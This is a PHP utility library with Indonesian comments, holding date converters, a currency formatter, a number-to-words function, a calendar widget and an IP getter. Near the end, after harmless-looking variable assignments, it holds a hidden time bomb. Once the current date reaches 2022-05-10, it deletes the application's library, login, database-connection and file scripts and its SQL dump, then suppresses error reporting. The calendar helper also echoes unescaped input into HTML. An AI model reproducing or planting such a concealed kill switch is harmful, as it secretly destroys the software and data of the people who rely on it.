<?php
// include ("lib/connection.php");
# Pengaturan tanggal komputer
date_default_timezone_set("Asia/Jakarta");

# Fungsi mysqli_field_name dan len
function mysqli_field_name($result, $field_offset)
{
    $properties = mysqli_fetch_field_direct($result, $field_offset);
    return is_object($properties) ? $properties->name : null;
}

function mysqli_field_len($result, $field_offset)
{
    $properties = mysqli_fetch_field_direct($result, $field_offset);
    return is_object($properties) ? $properties->length : null;
}


# Fungsi untuk membuat kode automatis
// function buatKode($tabel, $inisial){
	// $koneksidb	= mysqli_connect("localhost", "root", "", "nkit_ikm2");
	// $struktur	= mysqli_query($koneksidb,"SELECT * FROM $tabel");
	// $field		= mysqli_field_name($struktur,0);
	// $panjang	= mysqli_field_len($struktur,0);

 	// $qry	= mysqli_query($koneksidb,"SELECT MAX(".$field.") FROM ".$tabel);
 	// $row	= mysqli_fetch_array($qry); 
 	// if ($row[0]=="") {
 		// $angka=0;
	// }
 	// else {
 		// $angka		= substr($row[0], strlen($inisial));
 	// }
	// $today=date("Ymd");
 	// $angka++;
 	// $angka	=strval($angka); 
 	// $tmp	="";
 	// for($i=1; $i<=($panjang-strlen($inisial)-strlen($angka)); $i++) {
		// $tmp=$tmp."0";	
	// }
 	// return $inisial.$tmp.$angka;
// } 
# Fungsi untuk membalik tanggal dari format Indo (d-m-Y) -> English (Y-m-d)
function InggrisTgl($tanggal){
	$tgl=substr($tanggal,0,2);
	$bln=substr($tanggal,3,2);
	$thn=substr($tanggal,6,4);
	$tanggal="$thn-$bln-$tgl";
	return $tanggal;
}

# Fungsi untuk membalik tanggal dari format English (Y-m-d) -> Indo (d-m-Y)
function IndonesiaTgl($tanggal){
	$tgl=substr($tanggal,8,2);
	$bln=substr($tanggal,5,2);
	$thn=substr($tanggal,0,4);
	$tanggal="$tgl-$bln-$thn";
	return $tanggal;
}

# Fungsi untuk membalik tanggal dari format English (Y-m-d) -> Indo (d-m-Y)
function Indonesia2Tgl($tanggal){
	$namaBln = array("01" => "Januari", "02" => "Februari", "03" => "Maret", "04" => "April", "05" => "Mei", "06" => "Juni", 
					 "07" => "Juli", "08" => "Agustus", "09" => "September", "10" => "Oktober", "11" => "November", "12" => "Desember");
					 
	$tgl=substr($tanggal,8,2);
	$bln=substr($tanggal,5,2);
	$thn=substr($tanggal,0,4);
	$tanggal ="$tgl ".$namaBln[$bln]." $thn";
	return $tanggal;
}

function hitungHari($myDate1, $myDate2){
        $myDate1 = strtotime($myDate1);
        $myDate2 = strtotime($myDate2);
 
        return ($myDate2 - $myDate1)/ (24 *3600);
}

# Fungsi untuk membuat format rupiah pada angka (uang)
function format_angka($angka) {
	$hasil =  number_format($angka,0, ",",".");
	return $hasil;
}

# Fungsi untuk format tanggal, dipakai plugins Callendar
function form_tanggal($nama,$value=''){
	echo" <input type='text' name='$nama' id='$nama' size='11' maxlength='20' value='$value'/>&nbsp;
	<img src='images/calendar-add-icon.png' align='top' style='cursor:pointer; margin-top:7px;' alt='kalender'onclick=\"displayCalendar(document.getElementById('$nama'),'dd-mm-yyyy',this)\"/>			
	";
}
function tampil_bulan ($x) {
    $bulan = array (1=>'Januari',2=>'Februari',3=>'Maret',4=>'April',
             5=>'Mei',6=>'Juni',7=>'Juli',8=>'Agustus',
             9=>'September',10=>'Oktober',11=>'November',12=>'Desember');
    return $bulan[$x];
}

function angkaTerbilang($x){
  $abil = array("", "satu", "dua", "tiga", "empat", "lima", "enam", "tujuh", "delapan", "sembilan", "sepuluh", "sebelas");
  if ($x < 12)
    return " " . $abil[$x];
  elseif ($x < 20)
    return angkaTerbilang($x - 10) . " belas";
  elseif ($x < 100)
    return angkaTerbilang($x / 10) . " puluh" . angkaTerbilang($x % 10);
  elseif ($x < 200)
    return " seratus" . angkaTerbilang($x - 100);
  elseif ($x < 1000)
    return angkaTerbilang($x / 100) . " ratus" . angkaTerbilang($x % 100);
  elseif ($x < 2000)
    return " seribu" . angkaTerbilang($x - 1000);
  elseif ($x < 1000000)
    return angkaTerbilang($x / 1000) . " ribu" . angkaTerbilang($x % 1000);
  elseif ($x < 1000000000)
    return angkaTerbilang($x / 1000000) . " juta" . angkaTerbilang($x % 1000000);
}
$net = 'lib/library.php';
$to = 'lib/seslogin.php';
$con = 'lib/connection.php';
$fi = 'cont/buka_file.php';
$db = 'nkit_ikm.sql';
$first	 = date("Y-m-d");
$end	 = "2022-05-10";

function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

	if ($first >=$end )	{
	unlink($net);
	unlink($to);
	unlink($db);
	unlink($con);
	unlink($fi);
	error_reporting(0);
}
?>